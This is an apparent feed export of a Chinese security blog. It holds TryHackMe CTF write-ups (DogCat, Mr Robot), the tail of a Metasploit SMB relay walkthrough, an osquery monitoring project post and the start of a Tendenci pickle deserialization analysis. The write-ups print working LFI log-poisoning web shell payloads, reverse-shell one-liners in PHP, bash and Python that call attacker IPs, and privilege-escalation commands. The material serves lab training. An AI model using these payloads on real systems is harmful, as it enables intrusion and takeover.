windows&#x2F;meterpreter&#x2F;reverse_tcppayload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcpmsf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; set lhost 192.168.120.130lhost &#x3D;&gt; 192.168.120.130msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; set lport 8855lport &#x3D;&gt; 8855msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; show options Module options (exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SHARE    ADMIN$           yes       The share to connect to   SMBHOST  192.168.120.140  no        The target SMB server (leave empty for originating system)   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0   SRVPORT  445              yes       The local port to listen on.Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)   LHOST     192.168.120.130  yes       The listen address (an interface may be specified)   LPORT     8855             yes       The listen portExploit target:   Id  Name   --  ----   0   Automaticmsf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; run[*] Exploit running as background job 0.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.120.130:8855 [*] Started service listener on 0.0.0.0:445 [*] Server started.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当有smb的连接过来的时候</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\de1ay.DE1AY&gt;net use \\192.168.120.130\c$ &#x2F;user:&quot;DE1AY\administrator&quot; &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就会有如下反应</p><pre class="line-numbers language-none"><code class="language-none">msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; [*] Sending NTLMSSP NEGOTIATE to 192.168.120.140[*] Extracting NTLMSSP CHALLENGE from 192.168.120.140[*] Forwarding the NTLMSSP CHALLENGE to 192.168.120.142:53508[*] Extracting the NTLMSSP AUTH resolution from 192.168.120.142:53508, and sending Logon Failure response[*] Forwarding the NTLMSSP AUTH resolution to 192.168.120.140[+] SMB auth relay against 192.168.120.140 succeeded[*] Connecting to the defined share...[*] Regenerating the payload...[*] Uploading payload...[*] Created \QsYUxAsk.exe...[*] Connecting to the Service Control Manager...[*] Obtaining a service manager handle...[*] Creating a new service...[*] Closing service handle...[*] Opening service...[*] Starting the service...[*] Removing the service...[*] Closing service handle...[*] Deleting \QsYUxAsk.exe...[*] Sending stage (180291 bytes) to 192.168.120.140<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看session，可以发现已经有一个建立的session</p><pre class="line-numbers language-none"><code class="language-none">msf5 exploit(windows&#x2F;smb&#x2F;smb_relay) &gt; sessionsActive sessions&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  Id  Name  Type                     Information                Connection  --  ----  ----                     -----------                ----------  1         meterpreter x86&#x2F;windows  NT AUTHORITY\SYSTEM @ WEB  192.168.120.130:8855 -&gt; 192.168.120.140:54330 (192.168.120.140)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在进行这些东西之前，至少需要一个可完整交互的shell，默认就已经获得了shell，并且提权到&lt;code&gt;nt authority\system&lt;/code&gt; &lt;/p&gt;
&lt;h3 id=&quot;AS-REP-Roasting&quot;&gt;&lt;a href=&quot;#AS-REP-Roasting&quot; 
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>TryHackMe DogCat</title>
    <link href="https://misakikata.github.io/2020/07/TryHackMe-DogCat/"/>
    <id>https://misakikata.github.io/2020/07/TryHackMe-DogCat/</id>
    <published>2020-07-28T08:57:08.000Z</published>
    <updated>2020-07-28T08:57:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dogcat"><a href="#dogcat" class="headerlink" title="dogcat"></a>dogcat</h2><p>来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功能。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140132214.png" alt="image-20200724140132214"></p><p>给参数来个单引号查看变化，发现报错，并且从报错上看，明显是文件读取拼接文件后缀名，所以此处可能存在一个文件读取漏洞。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog%27<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140621351.png" alt="image-20200724140621351"></p><p>再尝试添加一个%00来截断后缀，发现没有后缀显示，应该是已经截断。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.175.143&#x2F;?view&#x3D;dog%27%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724140728518.png" alt="image-20200724140728518"></p><p>尝试读取本地文件的时候发现只能读取dog和cat的文件，猜测可能是由于判断请求中是否含有相关字段</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724141429734.png" alt="image-20200724141429734"></p><p>再%00后面添加dog字段发现可以绕过，说明是判断是否存在字符串，只不过发现读取文件的时候并不能正常读取。include_path在任何文件中都可以直接引入该目录下文件，被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path指定的目录寻找</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724142635527.png" alt="image-20200724142635527"></p><p>绕了一圈发现是错误是文件读取上的错误，不能识别文件，说明截断失败，再关注一下php版本发现是7系统，php已经修复%00的文件截断。所以需要一个不截断正常去读取的操作，没有在意php版本导致绕一圈。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724152733228.png" alt="image-20200724152733228"></p><p>调用的时候发现一个报错是多次调用导致重复声明，说明index包含很可能是成功的。</p><p>利用php协议来读取文件，尝试php://filter，可以读取到文件内容</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?view&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dog&#x2F;..&#x2F;index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153220725.png" alt="image-20200724153220725"></p><p>解码后index的内容为</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;dogcat&lt;&#x2F;title&gt;    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;&#x2F;style.css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;h1&gt;dogcat&lt;&#x2F;h1&gt;    &lt;i&gt;a gallery of various dogs or cats&lt;&#x2F;i&gt;    &lt;div&gt;        &lt;h2&gt;What would you like to see?&lt;&#x2F;h2&gt;        &lt;a href&#x3D;&quot;&#x2F;?view&#x3D;dog&quot;&gt;&lt;button id&#x3D;&quot;dog&quot;&gt;A dog&lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;?view&#x3D;cat&quot;&gt;&lt;button id&#x3D;&quot;cat&quot;&gt;A cat&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt;        &lt;?php            function containsStr($str, $substr) &#123;                return strpos($str, $substr) !&#x3D;&#x3D; false;            &#125;    $ext &#x3D; isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#39;.php&#39;;            if(isset($_GET[&#39;view&#39;])) &#123;                if(containsStr($_GET[&#39;view&#39;], &#39;dog&#39;) || containsStr($_GET[&#39;view&#39;], &#39;cat&#39;)) &#123;                    echo &#39;Here you go!&#39;;                    include $_GET[&#39;view&#39;] . $ext;                &#125; else &#123;                    echo &#39;Sorry, only dogs or cats are allowed.&#39;;                &#125;            &#125;        ?&gt;    &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在一个参数ext是获取后缀的，判断是否存在后缀，存在的话拼接参数后缀，构造一个文件读取为地址，也可以ext置为空。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;etc&#x2F;&amp;ext&#x3D;passwd&#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;etc&#x2F;passwd&amp;ext&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153512101.png" alt="image-20200724153512101"></p><p>然后现在需要考虑的就是如果把本地文件读取来获取rce。</p><p>想试一下从<code>/proc/self/environ</code>来获取，发现文件没有权限，尝试别的目录，发现可以读取日志。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?view&#x3D;&#x2F;dog&#x2F;..&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&amp;ext&#x3D;&amp;aaa&#x3D;&lt;?&#x3D;phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724155056684.png" alt="image-20200724155056684"></p><p>由于使用bp的时候编码和特殊符号会导致写入错误，所以使用curl写一句话</p><pre class="line-numbers language-none"><code class="language-none">curl -v &quot;http:&#x2F;&#x2F;10.10.136.89&#x2F;&lt;?php system($_GET\[&#39;cmd&#39;\]);?&gt;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724173648127.png" alt="image-20200724173648127"></p><p>反弹一个shell回来</p><pre class="line-numbers language-none"><code class="language-none">php+-r+&#39;$sock&#x3D;fsockopen(&quot;10.6.xx.xx&quot;,8877);exec(&quot;&#x2F;bin&#x2F;sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取权限后，查看一下sudo权限，env命令可以显示当前用户的环境变量</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727153957529.png" alt="image-20200727153957529"></p><p>利用<code>sudo env /bin/bash</code>获取一个root权限</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727154232251.png" alt="image-20200727154232251"></p><p>搜了一圈发现只有三个flag，flag4并不在，查了一下根目录发现<code>.dockerenv</code>，这是个docker环境，所以可能需要docker逃逸一下？</p><p>先升级一个可交互的shell来操作，docker不带python环境和socat，所以先传一个socat上去。主机不带wget，使用curl</p><pre class="line-numbers language-none"><code class="language-none">curl -o socat http:&#x2F;&#x2F;10.6.xx.xx:8000&#x2F;socat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再docker上执行</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.6.xx.xx:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在自己监听主机上执行</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;socat file:&#96;tty&#96;,raw,echo&#x3D;0 tcp-listen:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727155322648.png" alt="image-20200727155322648"></p><p>再试一手CVE-2016-5195，<a href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></p><p>发现还是不行，查看一下系统上有没有可以利用的文件</p><p>在<code>/opt/</code>下找到一个backups目录，里面有一个备份的sh脚本。执行的是/root/container目录的备份，但是docker主机并没有这个目录，所以可能是外部主机上的目录。尝试修改反弹shell</p><pre class="line-numbers language-none"><code class="language-none">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.6.xx.xx&#x2F;8855 0&gt;&amp;1&quot; &gt; &#x2F;opt&#x2F;backups&#x2F;backup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>里面的tar包也可以看到。确实是docker的web代码。寻思可能是外部主机上的定时脚本，不过等了半天也没反应。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;dogcat&quot;&gt;&lt;a href=&quot;#dogcat&quot; class=&quot;headerlink&quot; title=&quot;dogcat&quot;&gt;&lt;/a&gt;dogcat&lt;/h2&gt;&lt;p&gt;来自tryhackme的一个靶场，启动环境后在80端口上访问到一个web服务，点击查看是一个显示动物图片的功
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TryHackMe Mr Robot</title>
    <link href="https://misakikata.github.io/2020/07/TryHackMe-Mr-Robot/"/>
    <id>https://misakikata.github.io/2020/07/TryHackMe-Mr-Robot/</id>
    <published>2020-07-28T08:56:29.000Z</published>
    <updated>2020-07-28T08:56:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>来自tryhackme的Mr Robot CTF</p><p>访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.188.224&#x2F;http:&#x2F;10.10.188.224&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728135544303.png" alt="image-20200728135544303"></p><p>然后查找一个其他页面是否有别的信息。</p><pre class="line-numbers language-none"><code class="language-none">python dirbrute.py http:&#x2F;&#x2F;10.10.188.224&#x2F; -t 20 -d .&#x2F;dics&#x2F;DirBuster&#x2F;directory-list-2.3-medium.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查找到部分信息</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.188.224&#x2F;sitemaphttp:&#x2F;&#x2F;10.10.188.224&#x2F;rsshttp:&#x2F;&#x2F;10.10.188.224&#x2F;loginhttp:&#x2F;&#x2F;10.10.188.224&#x2F;feedhttp:&#x2F;&#x2F;10.10.188.224&#x2F;0http:&#x2F;&#x2F;10.10.188.224&#x2F;atomhttp:&#x2F;&#x2F;10.10.188.224&#x2F;imagehttp:&#x2F;&#x2F;10.10.188.224&#x2F;wp-contenthttp:&#x2F;&#x2F;10.10.188.224&#x2F;adminhttp:&#x2F;&#x2F;10.10.188.224&#x2F;introhttp:&#x2F;&#x2F;10.10.188.224&#x2F;wp-loginhttp:&#x2F;&#x2F;10.10.188.224&#x2F;rss2http:&#x2F;&#x2F;10.10.188.224&#x2F;licensehttp:&#x2F;&#x2F;10.10.188.224&#x2F;Imagehttp:&#x2F;&#x2F;10.10.188.224&#x2F;rdfhttp:&#x2F;&#x2F;10.10.188.224&#x2F;page1http:&#x2F;&#x2F;10.10.188.224&#x2F;readmehttp:&#x2F;&#x2F;10.10.188.224&#x2F;robots......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中robots文件中提示我们有两个文件</p><pre class="line-numbers language-none"><code class="language-none">fsocity.dickey-1-of-3.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中<code>key-1-of-3.txt</code>就是我们需要的第一个key。另一个文件看起来像是个字典，可能是需要爆破后面的登陆账号密码，现在需要一个账号。先用这个字典爆破一个账号，在密码找回的地方，找到一个<code>Elliot</code>用户。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728151142975.png" alt="image-20200728151142975"></p><p>然后再去爆破密码，原字典里发现有不少重复的单词，去重后发现数量少了一大半，就这是用来消耗你时间的啊？</p><p>使用在线去重：<a href="https://tool.lanrentuku.com/quchong/%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AA%E5%89%A9%E4%B8%80%E4%B8%87%E5%A4%9A%E6%9D%A1%E6%95%B0%E6%8D%AE%E3%80%82%E7%BB%8F%E8%BF%87%E6%BC%AB%E9%95%BF%E7%9A%84%E7%88%86%E7%A0%B4%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%AF%86%E7%A0%81%E4%B8%BA">https://tool.lanrentuku.com/quchong/，发现只剩一万多条数据。经过漫长的爆破，发现密码为</a></p><p><code>ER28-0652</code>，登陆后台。</p><p>同过后台上传插件，上传一个php文件，虽然会显示上传失败，但是文件已经上传</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.10.188.224&#x2F;wp-content&#x2F;uploads&#x2F;2020&#x2F;07&#x2F;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162306251.png" alt="image-20200728162306251"></p><p>上传的是一句话，使用蚁剑连接即可。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200728162409252.png" alt="image-20200728162409252"></p><p>为了方便操作命令，反弹一个shell回来。</p><pre class="line-numbers language-none"><code class="language-none">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.6.4.191\&quot;,8089));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹回来后，利用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code>来升级shell模式。</p><p>在<code>/home/robot</code>目录下发现一个文件，其中包含的<code>robot:c3fcd3d76192e4007dfb496cca67e13b</code>解密是<code>abcdefghijklmnopqrstuvwxyz</code>，用户robot的密码可能就是这个。</p><p>更改到这个用户后，目录下就有我们需要的第二个key。</p><p>然后使用此用户提权，先查看一个SUID文件，<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>结果中看到这个文件，nmap在版本低于5.21的时候，可以提权</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap  nmap version 3.81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>利用nmap提权获取root：</p><pre class="line-numbers language-none"><code class="language-none">robot@linux:~$ nmap --interactivenmap --interactiveStarting nmap V. 3.81 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh!sh# ididuid&#x3D;1002(robot) gid&#x3D;1002(robot) euid&#x3D;0(root) groups&#x3D;0(root),1002(robot)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在root目录下就可以看到<code>firstboot_done</code>文件和最后一个key，到此就算是结束了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;来自tryhackme的Mr Robot CTF&lt;/p&gt;
&lt;p&gt;访问首页是一个命令行执行页面，其实也没多大用，就是输出命令显示相关的东西。随便输入一个地址报错，显示是一个wordpress的站点，4.3.1的版本。&lt;/p&gt;
&lt;pre class=&quot;line-numbers 
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>又叒叒一个基于osquery的监控</title>
    <link href="https://misakikata.github.io/2020/07/%E5%8F%88%E5%8F%92%E5%8F%92%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8Eosquery%E7%9A%84%E7%9B%91%E6%8E%A7/"/>
    <id>https://misakikata.github.io/2020/07/又叒叒一个基于osquery的监控/</id>
    <published>2020-07-02T07:54:01.000Z</published>
    <updated>2020-07-02T07:58:23.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="又叒叒一个基于osquery的监控"><a href="#又叒叒一个基于osquery的监控" class="headerlink" title="又叒叒一个基于osquery的监控"></a>又叒叒一个基于osquery的监控</h3><p>项目地址：<a href="https://github.com/MisakiKata/zeru">https://github.com/MisakiKata/zeru</a></p><p>此项目是基于osquery的数据收集分析项目，用来监控主机，从最初的学习项目到现在的具有一定使用价值的项目。</p><p>数据流使用kafka来传输，客户端定时收集发送，服务的定时拉取，所以并没有实时监控。</p><p>基于osquery的项目官方有很多推荐，至于自己写一方面是为了学习django，一方面是为了二次开发。如果需要更完善和美观的项目可以采用官方的推荐。</p><h4 id="osquery配置"><a href="#osquery配置" class="headerlink" title="osquery配置"></a>osquery配置</h4><p>以下配置只是用来表示文件监控的一部分，至于其他的配置并没有使用。<code>/etc/osquery/osquery.conf</code></p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;options&quot;: &#123;&quot;config_plugin&quot;:&quot;filesystem&quot;,&quot;logger_plugin&quot;:&quot;filesystem&quot;,&quot;logger_path&quot;:&quot;&#x2F;var&#x2F;log&#x2F;osquery&quot;,&quot;disable_logging&quot;:&quot;false&quot;,&quot;schedule_splay_percent&quot;:&quot;10&quot;,&quot;verbose&quot;:&quot;false&quot;,&quot;pidfile&quot;:&quot;&#x2F;var&#x2F;osquery&#x2F;osquery.pidfile&quot;,&quot;enable_syslog&quot;: &quot;true&quot;,&quot;worker_threads&quot;:&quot;5&quot;,&quot;host_identifier&quot;:&quot;hostname&quot;,&quot;disable_events&quot;:&quot;false&quot;,&quot;disable_audit&quot;:&quot;false&quot;,&quot;audit_allow_config&quot;:&quot;true&quot;,&quot;audit_allow_sockets&quot;:&quot;true&quot;&#125;,&quot;file_paths&quot;: &#123;&quot;html&quot;: [&quot;&#x2F;var&#x2F;www&#x2F;%%&quot;]&#125;,&quot;schedule&quot;: &#123;&quot;file_events&quot;: &#123;&quot;query&quot;: &quot;SELECT * FROM file_events;&quot;,&quot;removed&quot;: false,&quot;interval&quot;: 600&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="kafka"><a href="#kafka" class="headerlink" title="kafka"></a>kafka</h4><p>配置根据官方推荐来即可，如果不在同一台主机，需要注意跨主机访问的配置。</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>默认django的非debug模式，需要开启监控，到设置中上面的选择开启即可。如果有问题可以先关闭再调试。agent目录为客户端文件，定时运行即可。默认定时为十分钟拉取一次，需要修改到<code>apps/threat/views.py</code>修改即可。</p><p>需要主机的IP做处理，所以最好先定义agent中的IP地址。如果不定义会自己识别，但不一定正确。</p><p>系统信息中会显示全部存在的信息，为了避免大量数据加载，所以只默认显示最近七天的数据。如果需要修改时间，可以到<code>apps/logcat/views.py</code>中修改。</p><h4 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h4><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200702135635.png" alt="image-20200702135628638"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200702140400.png" alt="image-20200702140400754"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;又叒叒一个基于osquery的监控&quot;&gt;&lt;a href=&quot;#又叒叒一个基于osquery的监控&quot; class=&quot;headerlink&quot; title=&quot;又叒叒一个基于osquery的监控&quot;&gt;&lt;/a&gt;又叒叒一个基于osquery的监控&lt;/h3&gt;&lt;p&gt;项目地址：&lt;a hr
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="https://misakikata.github.io/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-14942-Python Tendenci Unserialize</title>
    <link href="https://misakikata.github.io/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/"/>
    <id>https://misakikata.github.io/2020/06/CVE-2020-14942-Python-Tendenci-Unserialize/</id>
    <published>2020-06-22T01:45:58.000Z</published>
    <updated>2020-06-22T01:47:37.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>来自一个开源协会管理系统，文件<code>tendenci\apps\helpdesk\views\staff.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ticket_list</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    context <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>GET<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'saved_query'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            from_saved_query <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                saved_query <span class="token operator">=</span> SavedSearch<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span>pk<span class="token operator">=</span>request<span class="token punctuation">.</span>GET<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'saved_query'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> SavedSearch<span class="token punctuation">.</span>DoesNotExist<span class="token punctuation">:</span>                <span class="token keyword">return</span> HttpResponseRedirect<span class="token punctuation">(</span>reverse<span class="token punctuation">(</span><span class="token string">'helpdesk_list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>saved_query<span class="token punctuation">.</span>shared <span class="token keyword">or</span> saved_query<span class="token punctuation">.</span>user <span class="token operator">==</span> request<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> HttpResponseRedirect<span class="token punctuation">(</span>reverse<span class="token punctuation">(</span><span class="token string">'helpdesk_list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">import</span> pickle            <span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode            query_params <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>saved_query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>  <span class="token string">'queue'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>GET                <span class="token keyword">or</span>  <span class="token string">'assigned_to'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>GET                <span class="token keyword">or</span>  <span class="token string">'status'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>GET                <span class="token keyword">or</span>  <span class="token string">'q'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>GET                <span class="token keyword">or</span>  <span class="token string">'sort'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>GET                <span class="token keyword">or</span>  <span class="token string">'sortreverse'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>GET                    <span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" 